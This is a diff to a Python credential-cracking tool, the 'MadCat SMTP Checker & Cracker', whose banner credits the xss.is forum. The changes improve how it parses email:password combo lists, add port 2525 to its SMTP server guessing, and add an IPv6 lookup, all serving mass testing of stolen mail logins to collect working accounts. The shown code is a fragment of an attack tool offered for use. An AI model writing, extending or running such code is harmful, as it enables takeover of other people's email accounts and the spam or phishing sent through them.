@@ -1,6 +1,6 @@
 #!/usr/local/bin/python3
 
-import socket, threading, sys, ssl, smtplib, time, re, os, random, signal, queue, resource, base64
+import socket, threading, sys, ssl, time, re, os, random, signal, queue, resource, base64
 try:
 	import psutil, requests, dns.resolver
 except ImportError:
@@ -46,7 +46,7 @@ def show_banner():
          |█|    `   ██/  ███▌╟█, (█████▌   ╙██▄▄███   @██▀`█  ██ ▄▌             
          ╟█          `    ▀▀  ╙█▀ `╙`╟█      `▀▀^`    ▀█╙  ╙   ▀█▀`             
          ╙█                           ╙                                         
-          ╙     {b}MadCat SMTP Checker & Cracker v22.10.23{z}
+          ╙     {b}MadCat SMTP Checker & Cracker v22.11.03{z}
                 Made by {b}Aels{z} for community: {b}https://xss.is{z} - forum of security professionals
                 https://github.com/aels/mailtools
                 https://t.me/freebug
@@ -55,25 +55,25 @@ def show_banner():
 		print(line)
 		time.sleep(0.05)
 
-def red(s,type):
+def red(s,type=0):
 	return f'\033[{str(type)};31m'+str(s)+z
 
-def green(s,type):
+def green(s,type=0):
 	return f'\033[{str(type)};32m'+str(s)+z
 
-def orange(s,type):
+def orange(s,type=0):
 	return f'\033[{str(type)};33m'+str(s)+z
 
-def blue(s,type):
+def blue(s,type=0):
 	return f'\033[{str(type)};34m'+str(s)+z
 
-def violet(s,type):
+def violet(s,type=0):
 	return f'\033[{str(type)};35m'+str(s)+z
 
-def cyan(s,type):
+def cyan(s,type=0):
 	return f'\033[{str(type)};36m'+str(s)+z
 
-def white(s,type):
+def white(s,type=0):
 	return f'\033[{str(type)};37m'+str(s)+z
 
 def bold(s):
@@ -93,6 +93,12 @@ def tune_network():
 		# 	print('Better to run this script as root to allow better network performance')
 	except Exception as e:
 		print(wrn+'failed to set rlimit_nofile:   '+str(e))
+
+def check_ipv6():
+	try:
+		socket.has_ipv6 = requests.get('https://api6.ipify.org', timeout=3).text
+	except:
+		socket.has_ipv6 = False
 
 def debug(msg):
 	global debuglevel, results_que
@@ -183,7 +189,7 @@ def guess_smtp_server(domain):
 			ip = get_rand_ip_of_host(host)
 		except:
 			continue
-		for port in [587, 465, 25]:
+		for port in [2525, 587, 465, 25]:
 			debug(f'trying {host}, {ip}:{port}')
 			if is_listening(ip, port):
 					return ([host+':'+str(port)], default_login_template)
@@ -213,8 +219,8 @@ def find_email_password_collumnes(list_filename):
 			if email:
 				email_collumn = line.split(email[0])[0].count(':')
 				password_collumn = email_collumn+1
-				if re.search(r'@.+123', line):
-					password_collumn = line.split('123')[0].count(':')
+				if re.search(r'@[\w.-]+\.[a-z]{2,}:.+123', line):
+					password_collumn = [i for i, col in enumerate(line.split(':')) if re.search(r'[^@]+123', col)][0]
 					break
 	if email_collumn is not False:
 		return (email_collumn, password_collumn)
@@ -412,6 +418,7 @@ def printer(jobs_que, results_que):
 signal.signal(signal.SIGINT, quit)
 show_banner()
 tune_network()
+check_ipv6()
 try:
 	help_message = f'usage: \n{npt}python3 {sys.argv[0]} '+bold('list.txt')+' [verify_email@example.com] [ignored,email,domains] [start_from_line] [debug]'
 	list_filename = ([i for i in sys.argv if os.path.isfile(i) and sys.argv[0] != i]+[False]).pop(0)
@@ -465,13 +472,14 @@ domain_configs_cache = {}
 
 print(inf+'loading SMTP configs...'+up)
 load_smtp_configs()
-print(wl+okk+'loading SMTP configs:          '+bold(num(len(domain_configs_cache))+' lines'))
+print(wl+okk+'loaded SMTP configs:           '+bold(num(len(domain_configs_cache))+' lines'))
 print(inf+'source file:                   '+bold(list_filename))
 print(inf+'total lines to procceed:       '+bold(num(total_lines)))
 print(inf+'email & password colls:        '+bold(email_collumn)+' and '+bold(password_collumn))
 print(inf+'ignored email hosts:           '+bold(exclude_mail_hosts))
 print(inf+'goods file:                    '+bold(smtp_filename))
 print(inf+'verification email:            '+bold(verify_email or '-'))
+print(inf+'ipv6 address:                  '+bold(socket.has_ipv6 or '-'))
 input(npt+'press '+bold('[ Enter ]')+' to start...')
 
 threading.Thread(target=every_second, daemon=True).start()
